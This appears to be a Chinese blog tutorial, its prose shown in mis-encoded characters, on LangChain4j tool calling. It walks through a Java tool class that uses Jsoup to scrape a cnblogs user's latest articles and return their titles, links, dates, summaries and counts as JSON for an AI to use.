itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangChain4j å·¥å…·è°ƒç”¨å®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1990557030679672/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜NEO
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:35:08.000Z" title="Fri Jan 02 2026 07:35:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™ç§åœºæ™¯ï¼š</p>
<ul>
<li>ç”¨æˆ·é—® AIï¼š"å¸®æˆ‘æŸ¥ä¸‹ä»Šå¤©ä¸Šæµ·çš„å¤©æ°”"</li>
<li>AI å›ç­”ï¼š"æŠ±æ­‰ï¼Œæˆ‘æ— æ³•è·å–å®æ—¶ä¿¡æ¯ã€‚"</li>
</ul>
<p>**é—®é¢˜çš„æ ¸å¿ƒæ˜¯ï¼šAI æ²¡æœ‰å·¥å…·ã€‚**å°±åƒç»™ä½ ä¸€åŒæ‰‹è„šï¼Œè®©ä½ å»ç›–æˆ¿å­ï¼Œä½ ä¹Ÿåšä¸åˆ°ã€‚ä½†å¦‚æœç»™ä½ ä¸€å¥—å·¥å…·ç®±ï¼Œæƒ…å†µå°±å®Œå…¨ä¸åŒäº†ã€‚</p>
<p><strong>ä»Šå¤©æˆ‘ä»¬å°±æ¥ç»™ AI è£…ä¸Šä¸€å¥—å·¥å…·ç®±</strong>ï¼Œè®©å®ƒèƒ½å¤Ÿä»åšå®¢å›­å®æ—¶è·å–æœ€æ–°æŠ€æœ¯æ–‡ç« ã€‚</p>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯å·¥å…·è°ƒç”¨ï¼Ÿ</h2>
<p>ç®€å•æ¥è¯´ï¼Œå·¥å…·è°ƒç”¨å°±æ˜¯è®© AI èƒ½å¤Ÿ"å€Ÿç”¨"å¤–éƒ¨èƒ½åŠ›ã€‚</p>
<p>è¿™äº›èƒ½åŠ›åŒ…æ‹¬ä½†ä¸é™äºï¼š</p>
<ul>
<li>è”ç½‘æœç´¢</li>
<li>è°ƒç”¨ç¬¬ä¸‰æ–¹ API</li>
<li>è¯»å†™æ–‡ä»¶</li>
<li>æŸ¥è¯¢æ•°æ®åº“</li>
<li>æ‰§è¡Œä»£ç </li>
</ul>
<p><strong>ä½†æœ‰ä¸€ä¸ªå…³é”®ç‚¹è¦ç‰¹åˆ«æ³¨æ„</strong>ï¼š</p>
<p>å·¥å…·è°ƒç”¨ <strong>ä¸æ˜¯</strong> AI è‡ªå·±å»æ‰§è¡Œè¿™äº›å·¥å…·ï¼Œè€Œæ˜¯ AI è¯´"æˆ‘éœ€è¦è°ƒç”¨ XX å·¥å…·"ï¼ŒçœŸæ­£æ‰§è¡Œçš„æ˜¯æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºã€‚</p>
<p>æµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs">ç”¨æˆ·æé—® â†’ AI åˆ†ææ„å›¾ â†’ AI å†³å®šè°ƒç”¨å·¥å…·
â†’ æˆ‘ä»¬çš„ç¨‹åºæ‰§è¡Œå·¥å…· â†’ æŠŠç»“æœè¿”å›ç»™ AI â†’ AI ç»§ç»­å›ç­”
</code></pre>
<h2 data-id="heading-1">è¦å®ç°çš„ç›®æ ‡</h2>
<p>è®© AI èƒ½å¤ŸæŸ¥è¯¢åšå®¢å›­ç”¨æˆ·çš„æœ€æ–°æ–‡ç« ï¼Œå¹¶æå–è¿™äº›ä¿¡æ¯ï¼š</p>
<ul>
<li>æ–‡ç« æ ‡é¢˜</li>
<li>æ–‡ç« é“¾æ¥</li>
<li>å‘å¸ƒæ—¥æœŸ</li>
<li>æ‘˜è¦å†…å®¹</li>
<li>é˜…è¯»æ•°ã€è¯„è®ºæ•°ã€æ¨èæ•°</li>
</ul>
<p><strong>å®ç°æ–¹æ¡ˆ</strong>ï¼šç”¨ Jsoup æŠ“å–åšå®¢å›­é¡µé¢ï¼ŒæŠŠæ•°æ®æ•´ç†åè¿”å›ç»™ AIã€‚</p>
<h2 data-id="heading-2">å¿«é€Ÿäº†è§£æµç¨‹</h2>
<p>å®Œæ•´æµç¨‹å…¶å®å¾ˆç®€å•ï¼š</p>
<ol>
<li>ç”¨æˆ·æé—® â†’ 2. AI åˆ†ææ„å›¾ â†’ 3. AI å†³å®šè°ƒç”¨å·¥å…· â†’ 4. ç¨‹åºæ‰§è¡Œå·¥å…· â†’ 5. ç»“æœè¿”å›ç»™ AI â†’ 6. AI æ•´ç†åå›å¤ç”¨æˆ·</li>
</ol>
<p><strong>æ ¸å¿ƒå°±æ˜¯</strong>ï¼šAI ä¸ç›´æ¥è°ƒç”¨å·¥å…·ï¼Œè€Œæ˜¯å‘Šè¯‰æˆ‘ä»¬çš„ç¨‹åº"æˆ‘éœ€è¦è°ƒç”¨è¿™ä¸ªå·¥å…·"ï¼Œç¨‹åºæ‰§è¡Œå®ŒåæŠŠç»“æœç»™ AIï¼ŒAI å†åŸºäºç»“æœå›ç­”ç”¨æˆ·ã€‚</p>
<blockquote>
<p>æƒ³çœ‹è¯¦ç»†çš„è°ƒç”¨é“¾è·¯ï¼Ÿæ–‡ç« æœ€åæœ‰å®Œæ•´çš„æ—¶åºå›¾ï¼ŒåŒ…ä½ ä¸€çœ‹å°±æ‡‚ã€‚</p>
</blockquote>
<h2 data-id="heading-3">åŠ¨æ‰‹å®ç°ï¼ˆå››æ­¥æå®šï¼‰</h2>
<h3 data-id="heading-4">æ­¥éª¤ 1ï¼šå¼•å…¥ä¾èµ–</h3>
<p>å…ˆåœ¨ <code>pom.xml</code> ä¸­åŠ å…¥ Jsoupï¼ˆç½‘é¡µçˆ¬è™«åº“ï¼‰ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.jsoup<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jsoup<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.20.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-5">æ­¥éª¤ 2ï¼šç¼–å†™å·¥å…·ç±»</h3>
<p>åœ¨ <code>tools</code> åŒ…ä¸‹åˆ›å»ºä¸€ä¸ªå·¥å…·ç±»ï¼Œç”¨ <code>@Tool</code> æ³¨è§£å‘Šè¯‰ LangChain4jï¼š"è¿™æ˜¯ä¸€ä¸ªå·¥å…·"ã€‚</p>
<p><strong>âš ï¸ é‡ç‚¹</strong>ï¼šå·¥å…·æè¿°ä¸€å®šè¦å†™æ¸…æ¥šï¼ŒAI èƒ½å¦æ­£ç¡®è°ƒç”¨å·¥å…·å…¨çœ‹è¿™ä¸ªæè¿°ï¼</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * åšå®¢å›­æ–‡ç« æœç´¢å·¥å…·
 * ç”¨äºä»åšå®¢å›­æŠ“å–ç”¨æˆ·çš„æœ€æ–°æ–‡ç« ä¿¡æ¯
 *
 * <span class="hljs-doctag">@author</span> BNTang
 */</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CnblogsArticleTool</span> {

    <span class="hljs-comment">/**
     * ä»æŒ‡å®šç”¨æˆ·çš„åšå®¢å›­ä¸»é¡µè·å–æœ€æ–°çš„æŠ€æœ¯æ–‡ç« åˆ—è¡¨ã€‚
     * æ”¯æŒæå–æ–‡ç« æ ‡é¢˜ã€é“¾æ¥ã€å‘å¸ƒæ—¥æœŸã€æ‘˜è¦ã€é˜…è¯»æ•°ã€è¯„è®ºæ•°å’Œæ¨èæ•°ç­‰ä¿¡æ¯ã€‚
     *
     * <span class="hljs-doctag">@param</span> input åšå®¢å›­ç”¨æˆ·åæˆ–URLï¼Œå¯é€‰åœ°é™„åŠ "|N"æ¥é™åˆ¶ç»“æœæ•°é‡
     * <span class="hljs-doctag">@return</span> æŠ€æœ¯æ–‡ç« åˆ—è¡¨çš„JSONæ ¼å¼ï¼ŒåŒ…å«è¯¦ç»†ä¿¡æ¯ï¼Œè‹¥å¤±è´¥åˆ™è¿”å›é”™è¯¯ä¿¡æ¯
     */</span>
    <span class="hljs-meta">@Tool(name = "cnblogsSearch", value = """
            ä»åšå®¢å›­è·å–æœ€æ–°æ–‡ç« ã€‚è¾“å…¥å¯ä»¥æ˜¯ï¼š
            - åšå®¢å›­ç”¨æˆ·åï¼ˆä¾‹å¦‚ï¼š'someUser'ï¼‰
            - å®Œæ•´çš„ä¸ªäººä¸»é¡µURLï¼ˆä¾‹å¦‚ï¼š'https://www.cnblogs.com/someUser/'ï¼‰
            å¯é€‰æ‹©æ€§åœ°é™„åŠ '|N'æ¥é™åˆ¶ç»“æœæ•°é‡ï¼Œä¾‹å¦‚ï¼š'someUser|5'ã€‚
            è¿”å›åŒ…å«æ ‡é¢˜ã€é“¾æ¥ã€æ—¥æœŸã€æ‘˜è¦ã€é˜…è¯»æ•°ã€è¯„è®ºæ•°ã€æ¨èæ•°çš„JSONæ•°ç»„ã€‚
            """
    )</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">searchCnblogsArticles</span><span class="hljs-params">(<span class="hljs-meta">@P(value = "ç”¨æˆ·åæˆ–URLï¼ˆå¯é€‰åœ°é™„åŠ |é™åˆ¶æ•°é‡ï¼‰")</span> String input)</span> {
        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span> || input.trim().isEmpty()) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"{\"error\":\"Empty input\"}"</span>;
        }

        String[] parts = input.trim().split(<span class="hljs-string">"\\|"</span>, <span class="hljs-number">2</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> parts[<span class="hljs-number">0</span>].trim();
        <span class="hljs-type">int</span> <span class="hljs-variable">limit</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
        <span class="hljs-keyword">if</span> (parts.length == <span class="hljs-number">2</span>) {
            <span class="hljs-keyword">try</span> {
                limit = Math.max(<span class="hljs-number">1</span>, Math.min(<span class="hljs-number">100</span>, Integer.parseInt(parts[<span class="hljs-number">1</span>].trim())));
            } <span class="hljs-keyword">catch</span> (NumberFormatException ignored) { <span class="hljs-comment">/* keep default */</span> }
        }

        String url;
        <span class="hljs-keyword">if</span> (target.startsWith(<span class="hljs-string">"http://"</span>) || target.startsWith(<span class="hljs-string">"https://"</span>)) {
            url = target;
        } <span class="hljs-keyword">else</span> {
            url = <span class="hljs-string">"https://www.cnblogs.com/"</span> + target + <span class="hljs-string">"/"</span>;
        }

        <span class="hljs-type">Document</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> fetchDocumentWithRetries(url, <span class="hljs-number">3</span>, <span class="hljs-number">8000</span>);
        <span class="hljs-keyword">if</span> (doc == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"{\"error\":\"Failed to fetch or parse page\"}"</span>;
        }

        <span class="hljs-comment">// é€‰æ‹©åšå®¢æ–‡ç« çš„ä¸»å®¹å™¨</span>
        <span class="hljs-type">Elements</span> <span class="hljs-variable">dayElements</span> <span class="hljs-operator">=</span> doc.select(<span class="hljs-string">".day"</span>);

        List&lt;ArticleInfo&gt; results = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

        <span class="hljs-keyword">for</span> (Element dayEl : dayElements) {
            <span class="hljs-keyword">if</span> (results.size() &gt;= limit) {
                <span class="hljs-keyword">break</span>;
            }

            <span class="hljs-comment">// æå–æ ‡é¢˜å’Œé“¾æ¥</span>
            <span class="hljs-type">Element</span> <span class="hljs-variable">titleEl</span> <span class="hljs-operator">=</span> dayEl.selectFirst(<span class="hljs-string">".postTitle a, .postTitle2"</span>);
            <span class="hljs-keyword">if</span> (titleEl == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">continue</span>;
            }

            <span class="hljs-type">String</span> <span class="hljs-variable">title</span> <span class="hljs-operator">=</span> titleEl.text().trim();
            <span class="hljs-comment">// ç§»é™¤"[ç½®é¡¶]"æ ‡è®°</span>
            title = title.replaceAll(<span class="hljs-string">"^\\[ç½®é¡¶]\\s*"</span>, <span class="hljs-string">""</span>);

            <span class="hljs-type">String</span> <span class="hljs-variable">href</span> <span class="hljs-operator">=</span> titleEl.absUrl(<span class="hljs-string">"href"</span>);
            <span class="hljs-keyword">if</span> (href.isEmpty()) {
                href = titleEl.attr(<span class="hljs-string">"href"</span>).trim();
            }

            <span class="hljs-comment">// å»é‡æ£€æŸ¥</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">seen</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
            <span class="hljs-keyword">for</span> (ArticleInfo r : results) {
                <span class="hljs-keyword">if</span> (r.url.equals(href)) {
                    seen = <span class="hljs-literal">true</span>;
                    <span class="hljs-keyword">break</span>;
                }
            }
            <span class="hljs-keyword">if</span> (seen) {
                <span class="hljs-keyword">continue</span>;
            }

            <span class="hljs-comment">// æå–æ—¥æœŸ</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
            <span class="hljs-type">Element</span> <span class="hljs-variable">dateEl</span> <span class="hljs-operator">=</span> dayEl.selectFirst(<span class="hljs-string">".dayTitle a"</span>);
            <span class="hljs-keyword">if</span> (dateEl != <span class="hljs-literal">null</span>) {
                date = dateEl.text().trim();
            }

            <span class="hljs-comment">// æå–æ‘˜è¦</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">summary</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
            <span class="hljs-type">Element</span> <span class="hljs-variable">summaryEl</span> <span class="hljs-operator">=</span> dayEl.selectFirst(<span class="hljs-string">".c_b_p_desc, .postCon"</span>);
            <span class="hljs-keyword">if</span> (summaryEl != <span class="hljs-literal">null</span>) {
                summary = summaryEl.text().trim();
                <span class="hljs-comment">// ç§»é™¤"é˜…è¯»å…¨æ–‡"é“¾æ¥æ–‡æœ¬</span>
                summary = summary.replaceAll(<span class="hljs-string">"é˜…è¯»å…¨æ–‡$"</span>, <span class="hljs-string">""</span>).trim();
                <span class="hljs-comment">// é™åˆ¶æ‘˜è¦é•¿åº¦</span>
                <span class="hljs-keyword">if</span> (summary.length() &gt; <span class="hljs-number">200</span>) {
                    summary = summary.substring(<span class="hljs-number">0</span>, <span class="hljs-number">200</span>) + <span class="hljs-string">"..."</span>;
                }
            }

            <span class="hljs-comment">// æå–ç»Ÿè®¡ä¿¡æ¯</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">viewCount</span> <span class="hljs-operator">=</span> <span class="hljs-string">"0"</span>;
            <span class="hljs-type">String</span> <span class="hljs-variable">commentCount</span> <span class="hljs-operator">=</span> <span class="hljs-string">"0"</span>;
            <span class="hljs-type">String</span> <span class="hljs-variable">diggCount</span> <span class="hljs-operator">=</span> <span class="hljs-string">"0"</span>;

            <span class="hljs-type">Element</span> <span class="hljs-variable">postDesc</span> <span class="hljs-operator">=</span> dayEl.selectFirst(<span class="hljs-string">".postDesc"</span>);
            <span class="hljs-keyword">if</span> (postDesc != <span class="hljs-literal">null</span>) {
                <span class="hljs-type">Element</span> <span class="hljs-variable">viewEl</span> <span class="hljs-operator">=</span> postDesc.selectFirst(<span class="hljs-string">".post-view-count"</span>);
                <span class="hljs-keyword">if</span> (viewEl != <span class="hljs-literal">null</span>) {
                    viewCount = extractNumber(viewEl.text());
                }

                <span class="hljs-type">Element</span> <span class="hljs-variable">commentEl</span> <span class="hljs-operator">=</span> postDesc.selectFirst(<span class="hljs-string">".post-comment-count"</span>);
                <span class="hljs-keyword">if</span> (commentEl != <span class="hljs-literal">null</span>) {
                    commentCount = extractNumber(commentEl.text());
                }

                <span class="hljs-type">Element</span> <span class="hljs-variable">diggEl</span> <span class="hljs-operator">=</span> postDesc.selectFirst(<span class="hljs-string">".post-digg-count"</span>);
                <span class="hljs-keyword">if</span> (diggEl != <span class="hljs-literal">null</span>) {
                    diggCount = extractNumber(diggEl.text());
                }
            }

            <span class="hljs-keyword">if</span> (!title.isEmpty() &amp;&amp; !href.isEmpty()) {
                results.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArticleInfo</span>(title, href, date, summary, viewCount, commentCount, diggCount));
            }
        }

        <span class="hljs-keyword">if</span> (results.isEmpty()) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"{\"message\":\"æœªæ‰¾åˆ°æ–‡ç« ã€‚\"}"</span>;
        }

        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        sb.append(<span class="hljs-string">"["</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; results.size(); i++) {
            <span class="hljs-type">ArticleInfo</span> <span class="hljs-variable">article</span> <span class="hljs-operator">=</span> results.get(i);
            sb.append(<span class="hljs-string">"{"</span>);
            sb.append(<span class="hljs-string">"\"title\":"</span>).append(jsonEscape(article.title)).append(<span class="hljs-string">","</span>);
            sb.append(<span class="hljs-string">"\"url\":"</span>).append(jsonEscape(article.url)).append(<span class="hljs-string">","</span>);
            sb.append(<span class="hljs-string">"\"date\":"</span>).append(jsonEscape(article.date)).append(<span class="hljs-string">","</span>);
            sb.append(<span class="hljs-string">"\"summary\":"</span>).append(jsonEscape(article.summary)).append(<span class="hljs-string">","</span>);
            sb.append(<span class="hljs-string">"\"viewCount\":"</span>).append(article.viewCount).append(<span class="hljs-string">","</span>);
            sb.append(<span class="hljs-string">"\"commentCount\":"</span>).append(article.commentCount).append(<span class="hljs-string">","</span>);
            sb.append(<span class="hljs-string">"\"diggCount\":"</span>).append(article.diggCount);
            sb.append(<span class="hljs-string">"}"</span>);
            <span class="hljs-keyword">if</span> (i &lt; results.size() - <span class="hljs-number">1</span>) {
                sb.append(<span class="hljs-string">","</span>);
            }
        }
        sb.append(<span class="hljs-string">"]"</span>);
        <span class="hljs-keyword">return</span> sb.toString();
    }

    <span class="hljs-comment">/**
     * å¸¦é‡è¯•æœºåˆ¶è·å–ç½‘é¡µæ–‡æ¡£
     *
     * <span class="hljs-doctag">@param</span> url         ç›®æ ‡URL
     * <span class="hljs-doctag">@param</span> maxAttempts æœ€å¤§å°è¯•æ¬¡æ•°
     * <span class="hljs-doctag">@param</span> timeoutMs   è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰
     * <span class="hljs-doctag">@return</span> Jsoupæ–‡æ¡£å¯¹è±¡ï¼Œå¤±è´¥è¿”å›null
     */</span>
    <span class="hljs-keyword">private</span> Document <span class="hljs-title function_">fetchDocumentWithRetries</span><span class="hljs-params">(String url, <span class="hljs-type">int</span> maxAttempts, <span class="hljs-type">int</span> timeoutMs)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">userAgent</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Mozilla/5.0 (compatible; Bot/1.0; +https://example.com/bot)"</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">attempt</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">while</span> (attempt &lt; maxAttempts) {
            attempt++;
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">return</span> Jsoup.connect(url)
                        .userAgent(userAgent)
                        .timeout(timeoutMs)
                        .referrer(<span class="hljs-string">"https://www.google.com"</span>)
                        .get();
            } <span class="hljs-keyword">catch</span> (IOException e) {
                log.warn(<span class="hljs-string">"ç¬¬{}æ¬¡å°è¯•è·å– {} å¤±è´¥: {}"</span>, attempt, url, e.getMessage());
                <span class="hljs-keyword">try</span> {
                    Thread.sleep(<span class="hljs-number">500L</span> * attempt);
                } <span class="hljs-keyword">catch</span> (InterruptedException ignored) {
                    Thread.currentThread().interrupt();
                    <span class="hljs-keyword">break</span>;
                }
            }
        }
        log.error(<span class="hljs-string">"æ‰€æœ‰å°è¯•å‡å¤±è´¥ï¼Œæ— æ³•è·å– {}"</span>, url);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-comment">/**
     * ä»æ–‡æœ¬ä¸­æå–æ•°å­—
     *
     * <span class="hljs-doctag">@param</span> text åŒ…å«æ•°å­—çš„æ–‡æœ¬ï¼Œå¦‚"é˜…è¯»(123)"
     * <span class="hljs-doctag">@return</span> æå–çš„æ•°å­—å­—ç¬¦ä¸²
     */</span>
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">extractNumber</span><span class="hljs-params">(String text)</span> {
        <span class="hljs-keyword">if</span> (text == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"0"</span>;
        }
        text = text.replaceAll(<span class="hljs-string">"[^0-9]"</span>, <span class="hljs-string">""</span>);
        <span class="hljs-keyword">return</span> text.isEmpty() ? <span class="hljs-string">"0"</span> : text;
    }

    <span class="hljs-comment">/**
     * JSONå­—ç¬¦ä¸²è½¬ä¹‰
     *
     * <span class="hljs-doctag">@param</span> s å¾…è½¬ä¹‰çš„å­—ç¬¦ä¸²
     * <span class="hljs-doctag">@return</span> è½¬ä¹‰åçš„JSONå­—ç¬¦ä¸²
     */</span>
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">jsonEscape</span><span class="hljs-params">(String s)</span> {
        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"\"\""</span>;
        }
        <span class="hljs-type">String</span> <span class="hljs-variable">escaped</span> <span class="hljs-operator">=</span> s.replace(<span class="hljs-string">"\\"</span>, <span class="hljs-string">"\\\\"</span>)
                .replace(<span class="hljs-string">"\""</span>, <span class="hljs-string">"\\\""</span>)
                .replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">"\\n"</span>)
                .replace(<span class="hljs-string">"\r"</span>, <span class="hljs-string">"\\r"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"\""</span> + escaped + <span class="hljs-string">"\""</span>;
    }

    <span class="hljs-comment">/**
     * æ–‡ç« ä¿¡æ¯ç±»
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArticleInfo</span> {
        String title;
        String url;
        String date;
        String summary;
        String viewCount;
        String commentCount;
        String diggCount;

        ArticleInfo(String title, String url, String date, String summary,
                    String viewCount, String commentCount, String diggCount) {
            <span class="hljs-built_in">this</span>.title = title;
            <span class="hljs-built_in">this</span>.url = url;
            <span class="hljs-built_in">this</span>.date = date;
            <span class="hljs-built_in">this</span>.summary = summary;
            <span class="hljs-built_in">this</span>.viewCount = viewCount;
            <span class="hljs-built_in">this</span>.commentCount = commentCount;
            <span class="hljs-built_in">this</span>.diggCount = diggCount;
        }
    }
}
</code></pre>
<p><strong>æ ¸å¿ƒé€»è¾‘</strong>ï¼š</p>
<ol>
<li>è§£æç”¨æˆ·è¾“å…¥ï¼ˆæ”¯æŒç”¨æˆ·åæˆ– URLï¼‰</li>
<li>ç”¨ Jsoup æŠ“å–åšå®¢å›­é¡µé¢</li>
<li>ç”¨ CSS é€‰æ‹©å™¨æå–æ–‡ç« ä¿¡æ¯</li>
<li>è¿”å› JSON æ ¼å¼çš„ç»“æœ</li>
</ol>
